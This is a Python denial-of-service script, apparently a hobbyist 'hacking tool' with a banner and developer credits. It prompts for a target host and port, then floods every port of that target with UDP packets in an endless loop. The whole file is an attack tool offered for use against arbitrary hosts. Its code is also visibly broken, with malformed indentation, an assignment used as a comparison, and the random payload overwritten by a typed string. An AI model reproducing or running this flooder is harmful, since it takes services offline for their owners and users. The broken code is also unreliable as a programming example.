#Author WHITE L'
import socket
import os
import random
import time
import sys

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
K_bytes = random._urandom(35516)
K_bytes = random._urandom(35512)

os.system("clear")

print(" ")
print("                              $$\                       $ \                     ")
print("                              $$ |                      $$ |                    ")
print(" $$$$$$\   $$$$$$\   $$$$$$\  $$ | $$$$$$\         $$$$$$$ | $$$$$$\   $$$$$$$\ ")
print("$$  __$$\  \____$$\ $$  __$$\ $$ |$$  __$$\       $$  __$$ |$$  __$$\ $$  _____|")
print("$$$$$$$$ | $$$$$$$ |$$ /  $$ |$$ |$$$$$$$$ |      $$ /  $$ |$$ /  $$ |\$$$$$$\  ")
print("$$   ____|$$  __$$ |$$ |  $$ |$$ |$$   ____|      $$ |  $$ |$$ |  $$ | \____$$\ ")
print("\$$$$$$$\ \$$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\       \$$$$$$$ |\$$$$$$  |$$$$$$$  |")
print(" \_______| \_______| \____$$ |\__| \_______|       \_______| \______/ \_______/ ")
print("                    $$\   $$ |                                                  ")
print("                    \$$$$$$  |                                                  ")
print("                     \______/                                                   ")
print()
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : White Eagle" + N + "   Eagle Dos From - " + B + "" + R + "Zoom Hackers" + N)
print()
print()
print("\033[32m================================================================\033[0m")
print("\033[32m{YELLOW}Tool Devoloper : {YELLOW}ENIONS • DARKNESS\033[0m")
print("\033[33m{YELLOW}Github 	       : {YELLOW}https://github.com/ENIONS-DARKNES/\033[0m")
print("\033[33m{YELLOW}Telegram       : {YELLOW}https://t.me/Enions•DARKNESS\033[0m")
print("\033[32m================================================================\033[0m")
print()

ip = input("[+] Enter the targets host : ")
Port = input("[+] Enter the targets port : ")
sent = input("[+] Enter the targets packet 1-20000000 : ")
ping = input("[+] Enter the targets ping 1-20000000 : ")
K_bytes = input("[+] Enter the bytes tools : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(K_bytes, (ip, port))
        if K_bytes==65534:
                K_bytes=1
                if port ==65534:
                port=1
                if sent =65534:
                sent=1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Mengirim Packet \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
